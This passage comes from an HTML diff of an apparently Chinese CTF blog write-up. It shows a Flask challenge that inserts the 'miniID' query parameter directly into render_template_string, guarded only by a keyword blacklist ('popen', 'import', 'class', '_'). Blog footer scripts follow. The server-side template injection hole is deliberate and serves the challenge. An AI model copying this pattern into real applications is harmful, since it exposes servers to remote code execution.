  def safe_jinja(m):</span><br><span class="line">        forbidden = [&#x27;[&#x27;,&#x27;&#123;&#123;&#x27;,&#x27;_&#x27;,&#x27;class&#x27;,&#x27;+&#x27;,&#x27;popen&#x27;,&#x27;*&#x27;,&#x27;import&#x27;,&#x27;request&#x27;]</span><br><span class="line">        for n in forbidden:</span><br><span class="line">            while True:</span><br><span class="line">                if n in m:</span><br><span class="line">                    return &quot;Forbidden!!!&quot;</span><br><span class="line">                else:</span><br><span class="line">                    break</span><br><span class="line">        return m</span><br><span class="line">    id = request.args.get(&#x27;miniID&#x27;)</span><br><span class="line">    html = &#x27;&#x27;&#x27;</span><br><span class="line">        &lt;h2 align=&quot;center&quot;&gt;it&#x27;s time.Show me your documents,please.&lt;/h2&gt;</span><br><span class="line">        &lt;h2 align=&quot;center&quot;&gt;I will GET your miniID.&lt;/h2&gt;</span><br><span class="line">        &lt;h2 align=&quot;center&quot;&gt;%s&lt;/h2&gt;</span><br><span class="line">    &#x27;&#x27;&#x27;%(id)</span><br><span class="line">    html = safe_jinja(html)</span><br><span class="line">    return render_template_string(html)</span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(host=&#x27;0.0.0.0&#x27;,port=80)</span><br></pre></td></tr></table></figure>
+<p>https://cloud.tencent.com/developer/article/2238031?areaSource=&amp;traceId=</p>
+<p>https://yagsheg.com/2021/05/08/SUID-%E6%8F%90%E6%9D%83%E5%B0%8F%E8%AE%B0/</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Web/" rel="tag"><i class="fa fa-tag"></i> Web</a>
+              <a href="/tags/CTF/" rel="tag"><i class="fa fa-tag"></i> CTF</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2022-CPIPC-Preliminary/" rel="prev" title="2022 中国研究生网络安全创新大赛 线上预选赛 部分题解">
+                  <i class="fa fa-chevron-left"></i> 2022 中国研究生网络安全创新大赛 线上预选赛 部分题解
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/Study-Unauthorized-Shiro/" rel="next" title="浅析 Shiro 未授权 CVE">
+                  浅析 Shiro 未授权 CVE <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+    
+  <div class="comments disqusjs-container">
+    <noscript>Please enable JavaScript to view the comments powered by Disqus.</noscript>
+  </div>
+  
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  <script src="https://cdn.bootcdn.net/ajax/libs/jquery/3.6.4/jquery.min.js"></script>
+  <script src="/live2d-widget/autoload.js"></script>
+  &copy; 2018 – 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">南溟NaN</span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+    </div>
+  </footer>
+
+  
+  <div class="reading-progress-bar"></div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">true</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"none","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
+<script src="/js/third-party/math/mathjax.js"></script>
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/disqusjs/3.0.2/styles/disqusjs.css" integrity="sha256-71XarXwNr1Td27HmZI9zjY+rMzRdush6/glo6VFXp7o=" crossorigin="anonymous">
+
+<script class="next-config" data-name="disqusjs" type="application/json">{"enable":true,"api":"https://disqus.skk.moe/disqus/","apikey":"Cz7uQCDoGwWYGv80HeDq40mZr1rrmYy9tHhCpcWG95DFzOD1TJKLXtbTxFqWBCr5","shortname":"southseast","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/disqusjs/3.0.2/disqusjs.es2015.umd.min.js","integrity":"sha256-okP99ZQKVpIy7+NogAMpGlIQzJa9XKXhIJcFgdju5bU="}}</script>
+<script src="/js/third-party/comments/disqusjs.js"></script>
+
+</body>
+</html>
